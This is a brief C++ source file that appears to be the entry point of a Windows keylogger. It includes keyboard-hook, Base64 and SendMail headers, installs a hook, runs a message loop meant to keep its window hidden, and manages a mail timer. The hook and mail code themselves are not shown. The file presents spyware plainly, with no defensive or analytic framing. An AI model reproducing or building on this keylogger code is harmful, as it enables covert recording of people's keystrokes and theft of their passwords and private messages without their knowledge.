#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "io.h"
#include "timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

int main()
{
    MSG mssg;

    IO::MKDir(IO::GetOurPath(true));

    InstallHook();

    while(GetMessage(&mssg,NULL,0,0)){
        TranslateMessage(&mssg);
        DispatchMessage(&mssg);
    }
    //because the message the system is waiting for is never gonna come, it hides the window

    MailTimer.Stop();

    return 0;
}
